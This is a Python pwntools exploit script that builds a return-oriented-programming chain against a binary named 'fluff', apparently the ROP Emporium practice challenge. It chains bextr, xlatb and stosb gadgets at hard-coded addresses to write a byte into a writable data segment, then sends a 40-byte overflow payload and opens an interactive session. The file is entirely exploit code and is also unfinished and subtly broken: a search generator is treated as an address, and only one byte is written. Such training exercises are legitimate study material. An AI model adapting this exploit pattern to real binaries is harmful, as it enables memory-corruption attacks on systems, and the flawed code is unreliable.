import ctypes
from pwn import *

def prepare_rbx(target, rop):
    pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget = p64(0x0040062a)      # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    rop.raw(pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget)
    rop.raw(p64(0x4000)) # Extract 64 bits from offset 0 in RCX. Results will be written to RBX.
    rop.raw(p64(ctypes.c_ulong(target - magic_const).value))

def prepare_al(target, current_al, rop, elf):
    '''
    return: The current value in the AL register
    '''
    xlat_ret_gadget = p64(0x00400628)                               # xlatb; ret;
    #  target_byte_addr = next(elf.search(target))
    target_byte_addr = elf.search(target)
    rbx = ctypes.c_ulong(target_byte_addr - current_al).value
    prepare_rbx(rbx, rop)
    rop.raw(xlat_ret_gadget)
    return target

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './fluff'
io = process(PROCESS)

# Debugging
gdbscript = "b *0x00400628"
pid = gdb.attach(io, gdbscript=gdbscript)

# Gadgets
rop = ROP(io.elf)
writable_data_segment = p64(0x00601028)
stosb_gadget = p64(0x00400639)                                  # stosb byte [rdi], al; ret;
pop_rdi_ret = p64(0x004006a3)                                   # pop rdi; ret;
magic_const = 0x3ef2

# Build the ROP chain

# Point RDI to the writeable data segment
rop.raw(pop_rdi_ret)
rop.raw(writable_data_segment)

# Prepare the AL register
target = b"f"
initial_al = 0x0b
prepare_al(target, initial_al, rop, io.elf)

# Write the byte from the AL register to the writable data segment
rop.raw(stosb_gadget)

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()

